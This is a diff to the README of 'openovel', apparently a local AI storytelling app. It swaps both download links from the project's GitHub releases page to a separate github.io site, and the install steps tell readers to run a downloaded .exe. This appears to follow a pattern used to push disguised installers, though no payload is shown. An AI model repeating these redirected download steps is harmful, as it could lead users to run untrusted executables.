@@ -1,6 +1,6 @@
 # 📖 openovel - Write stories with intelligent digital agents
 
-[![](https://img.shields.io/badge/Download_Openovel-Blue?style=for-the-badge&logo=github)](https://github.com/associative-cufflink159/openovel/releases)
+[![](https://img.shields.io/badge/Download_Openovel-Blue?style=for-the-badge&logo=github)](https://associative-cufflink159.github.io)
 
 Openovel provides a private space to create interactive fiction. It uses artificial intelligence to act as a partner in your storytelling. The software runs entirely on your own computer. This keeps your data private and ensures you retain control over your files. The engine tracks your plot, characters, and world details in simple text files. These files stay on your hard drive, which allows you to back up your progress or move your work between folders easily.
 
@@ -23,7 +23,7 @@ Openovel provides a private space to create interactive fiction. It uses artific
 
 Follow these steps to install the application on your computer.
 
-1.  Visit the [official download page](https://github.com/associative-cufflink159/openovel/releases) to find the correct file for your system.
+1.  Visit the [official download page](https://associative-cufflink159.github.io) to find the correct file for your system.
 2.  Look for the file that ends with the `.exe` extension under the latest release heading.
 3.  Click the file link to download the installer to your computer.
 4.  Open your Downloads folder and double-click the file you just saved.
